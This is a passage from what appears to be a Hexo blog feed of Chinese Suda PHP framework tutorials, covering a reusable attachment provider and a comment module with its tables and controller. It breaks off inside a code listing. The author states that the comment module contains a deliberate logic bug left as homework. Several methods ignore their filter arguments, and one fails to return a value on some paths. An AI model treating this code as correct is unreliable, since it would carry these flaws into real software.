class="title">AttachmentProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $controller;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;controller =  <span class="keyword">new</span> AttachmentController($name);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(int $target, File $attachment)</span>:<span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;add($target, $attachment);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttachments</span><span class="params">(int $target)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;getAttachments($target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">(int $attachmentId)</span>:<span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;delete($attachmentId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加到表白墙模块"><a href="#添加到表白墙模块" class="headerlink" title="添加到表白墙模块"></a>添加到表白墙模块</h2><p>只需要在表白墙的API映射表中添加，注意这里参数是一个表类的字符表示，而不是上面的一个单纯的字符串了：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">v1.0:</span></span><br><span class="line"><span class="attr">  confession-wall:</span> <span class="string">dxkite.confession.wall.provider.ConfessionProvider</span></span><br><span class="line"><span class="attr">  confession-wall-comment:</span> <span class="string">dxkite.comments.provider.CommentProvider(confession-wall)</span></span><br><span class="line"><span class="attr">  confession-wall-attachment:</span> <span class="string">dxkite.attachments.provider.AttachmentProvider(dxkite.confession.wall.table.ConfessionTable)</span></span><br><span class="line"><span class="attr">  confession-wall-setting:</span> <span class="string">dxkite.confession.wall.provider.ConfessionSettingProvider</span></span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>由于我们的<code>add</code> 方法中包含了文件, 所以不能用简单的json来传输,现在采用Form表提交:</p><p><img src="1.png" alt=""></p><p>为了保证数据的准确，用Form提交的时候必须要有参数名，这个参数名和函数声明的地方的参数名保持一致，而不是之前使用JSON的时候采用忽略参数名的形式提交了。</p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul><li>复现</li><li>将评论模块的复用实现方式改成附件的实现方式</li><li><strong>评论模块有逻辑BUG，请找出并改正</strong></li></ul>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> 通用附件 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 18 通用评论功能模块</title>
      <link href="/2018/08/27/suda-comment/"/>
      <url>/2018/08/27/suda-comment/</url>
      <content type="html"><![CDATA[<p>这里我们写一个评论功能，对其的要求也不高，添加这个模块后，我们不管是表白墙还是文章模块都要可以用，使用也要很简单。为了实现这个功能，我从框架层面升级了一波，基础模块也变更了部分。</p><ul><li><a href="dxkite-support.8.27.mod">Support</a></li><li>更新框架</li></ul><a id="more"></a><h2 id="评论设计"><a href="#评论设计" class="headerlink" title="评论设计"></a>评论设计</h2><p>我们要实现的评论格式显示好之后大概如下</p><p><img src="1.png" alt=""></p><p>功能要求：</p><ol><li>评论目标</li><li>回复回复（回复下面的评论）</li><li>回复回复的回复（@某人并回复）</li></ol><h2 id="表设计"><a href="#表设计" class="headerlink" title="表设计"></a>表设计</h2><p>因为一个网站的功能里，可能回复的数量是最多的，这里我们分两个表（其实一个表也可以做到）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">comments</span>\<span class="title">table</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 评论</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommentTable</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">archive</span>\<span class="title">Table</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> CONTENT_TYPE = <span class="string">'markdown'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> STATUS_DELETE = <span class="number">0</span>;  <span class="comment">// 删除状态</span></span><br><span class="line">    <span class="keyword">const</span> STATUS_NORMAL = <span class="number">1</span>;  <span class="comment">// 正常状态</span></span><br><span class="line">    <span class="keyword">const</span> STATUS_DRAFT = <span class="number">2</span>;  <span class="comment">// 草稿状态</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $subfix=null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct(<span class="string">'comment'</span>. <span class="keyword">self</span>::parseSubfix($subfix));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseSubfix</span><span class="params">(?string $subfix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_null($subfix)) &#123;</span><br><span class="line">            $subfix = <span class="string">'_'</span>.$subfix;</span><br><span class="line">            <span class="keyword">return</span> preg_replace(<span class="string">'/[^\w]+/'</span>,<span class="string">'_'</span>,$subfix);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onBuildCreator</span><span class="params">($table)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $table-&gt;fields(</span><br><span class="line">            $table-&gt;field(<span class="string">'id'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;primary()-&gt;unsigned()-&gt;auto(),</span><br><span class="line">            $table-&gt;field(<span class="string">'user'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;key()-&gt;comment(<span class="string">'发布者'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'target'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;key()-&gt;comment(<span class="string">'目标'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'content'</span>, <span class="string">'text'</span>)-&gt;comment(<span class="string">"文字内容"</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'time'</span>, <span class="string">'int'</span>, <span class="number">11</span>)-&gt;key()-&gt;unsigned()-&gt;comment(<span class="string">'发表时间'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'ip'</span>, <span class="string">'varchar'</span>, <span class="number">32</span>)-&gt;comment(<span class="string">'发布IP'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'status'</span>, <span class="string">'int'</span>, <span class="number">11</span>)-&gt;key()-&gt;unsigned()-&gt;default(<span class="keyword">self</span>::STATUS_DRAFT)-&gt;comment(<span class="string">'状态'</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用Markdown 对内容进行默认编码</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_inputContentField</span><span class="params">(string $content)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content_pack($content, <span class="keyword">self</span>::CONTENT_TYPE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将内容解码成HTML格式</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_outputContentField</span><span class="params">(string $content)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 解码成对象</span></span><br><span class="line">        <span class="keyword">if</span> ($object = content_unpack($content)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 未设置解码则按text编码</span></span><br><span class="line">        <span class="keyword">return</span> content_create($content, <span class="string">'text'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里为了实现复用的功能，我们在构造函数中给表名加了个后缀（subfix），这个表的功能就是存储评论（1）、现在我们来存储评论的评论、评论的回复。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">comments</span>\<span class="title">table</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 子评论</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubCommentTable</span> <span class="keyword">extends</span> <span class="title">CommentTable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $subfix =null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::__construct(<span class="string">'sub'</span> .<span class="keyword">self</span>::parseSubfix($subfix));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onBuildCreator</span><span class="params">($table)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $table = <span class="keyword">parent</span>::onBuildCreator($table);</span><br><span class="line">        <span class="keyword">return</span> $table-&gt;fields(</span><br><span class="line">            $table-&gt;field(<span class="string">'parent'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;key()-&gt;comment(<span class="string">'父评论'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'reply'</span>, <span class="string">'bigint'</span>, <span class="number">20</span>)-&gt;key()-&gt;comment(<span class="string">'回复'</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为表结构相似，我们这里继承扩展一下就可以了，加了两个表段，表示回复了谁，回复的是那个评论。</p><h2 id="分模块"><a href="#分模块" class="headerlink" title="分模块"></a>分模块</h2><p>在实现之前我们还需把他放到一个独立的模块去（毕竟功能要用的多，当然是独立出来）</p><h2 id="基本功能实现"><a href="#基本功能实现" class="headerlink" title="基本功能实现"></a>基本功能实现</h2><p>功能实现非常简单，也就是对评论的 <code>CUDR</code>，但是这里要注意的是，Controller和Provider的构造函数都含参数。</p><h3 id="dxkite-comments-controller-CommentController"><a href="#dxkite-comments-controller-CommentController" class="headerlink" title="dxkite\comments\controller\CommentController"></a>dxkite\comments\controller\CommentController</h3><p>控制器实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">comments</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">comments</span>\<span class="title">table</span>\<span class="title">CommentTable</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">comments</span>\<span class="title">table</span>\<span class="title">SubCommentTable</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">view</span>\<span class="title">TablePager</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 评论</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommentController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $commentTable;</span><br><span class="line">    <span class="keyword">protected</span> $subCommentTable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;commentTable= <span class="keyword">new</span> CommentTable($name);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;subCommentTable= <span class="keyword">new</span> SubCommentTable($name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(int $target, string $content)</span>:<span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user =  get_user_id();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;commentTable-&gt;insert([</span><br><span class="line">            <span class="string">'user'</span> =&gt; $user,</span><br><span class="line">            <span class="string">'target'</span> =&gt; $target,</span><br><span class="line">            <span class="string">'content'</span> =&gt; $content,</span><br><span class="line">            <span class="string">'time'</span> =&gt; time(),</span><br><span class="line">            <span class="string">'ip'</span> =&gt; request()-&gt;ip(),</span><br><span class="line">            <span class="string">'status'</span> =&gt;  CommentTable::STATUS_NORMAL,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 评论评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $comment</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">comment</span><span class="params">(int $comment, string $content)</span>:<span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user =  get_user_id();</span><br><span class="line">        <span class="keyword">if</span> ($parent = <span class="keyword">$this</span>-&gt;commentTable-&gt;getByPrimaryKey($comment)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;subCommentTable-&gt;insert([</span><br><span class="line">                <span class="string">'user'</span> =&gt; $user,</span><br><span class="line">                <span class="string">'target'</span> =&gt; $parent[<span class="string">'target'</span>],</span><br><span class="line">                <span class="string">'content'</span> =&gt; $content,</span><br><span class="line">                <span class="string">'parent'</span>=&gt; $comment,</span><br><span class="line">                <span class="string">'time'</span> =&gt; time(),</span><br><span class="line">                <span class="string">'ip'</span> =&gt; request()-&gt;ip(),</span><br><span class="line">                <span class="string">'status'</span> =&gt;  CommentTable::STATUS_NORMAL,</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $comment</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> boolean $sub</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span><span class="params">(int $comment, bool $sub = false)</span>:<span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user =  get_user_id();</span><br><span class="line">        $table = $sub ? <span class="keyword">$this</span>-&gt;subCommentTable : <span class="keyword">$this</span>-&gt;commentTable;</span><br><span class="line">        <span class="keyword">if</span> ($that = $table-&gt;getByPrimaryKey($comment)) &#123;</span><br><span class="line">            <span class="comment">// 只有自己能够删除</span></span><br><span class="line">            <span class="keyword">if</span> ($that[<span class="string">'user'</span>] == $user) &#123;</span><br><span class="line">                <span class="keyword">return</span> $table-&gt;updateByPrimaryKey($that[<span class="string">'id'</span>], [</span><br><span class="line">                    <span class="string">'status'</span> =&gt;  CommentTable::STATUS_DELETE,</span><br><span class="line">                ]) &gt; <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 回复子评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $subcommet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reply</span><span class="params">(int $subcommet, string $content)</span>:<span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $user =  get_user_id();</span><br><span class="line">        <span class="keyword">if</span> ($parent = <span class="keyword">$this</span>-&gt;subCommentTable-&gt;getByPrimaryKey($subcommet)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;subCommentTable-&gt;insert([</span><br><span class="line">                <span class="string">'user'</span> =&gt; $user,</span><br><span class="line">                <span class="string">'target'</span> =&gt; $parent[<span class="string">'target'</span>],</span><br><span class="line">                <span class="string">'reply'</span> =&gt; $parent[<span class="string">'user'</span>],</span><br><span class="line">                <span class="string">'content'</span> =&gt; $content,</span><br><span class="line">                <span class="string">'parent'</span>=&gt; $parent[<span class="string">'parent'</span>],</span><br><span class="line">                <span class="string">'time'</span> =&gt; time(),</span><br><span class="line">                <span class="string">'ip'</span> =&gt; request()-&gt;ip(),</span><br><span class="line">                <span class="string">'status'</span> =&gt;  CommentTable::STATUS_NORMAL,</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取目标评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $target</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer|null $page</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $row</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getComment</span><span class="params">(int $target, ?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TablePager::listWhere(<span class="keyword">$this</span>-&gt;commentTable, [<span class="string">'status'</span> =&gt; CommentTable::STATUS_NORMAL], [], $page, $row);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取评论的评论</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $comment</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer|null $page</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $row</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array|null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSubComment</span><span class="params">(int $comment, ?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> TablePager::listWhere(<span class="keyword">$this</span>-&gt;subCommentTable, [<span class="string">'status'</span> =&gt; CommentTable::STATUS_NORMAL], [], $page, $row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="dxkite-comments-provider-CommentProvider"><a href="#dxkite-comments-provider-CommentProvider" class="headerlink" title="dxkite\comments\provider\CommentProvider"></a>dxkite\comments\provider\CommentProvider</h3><p>提供者实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 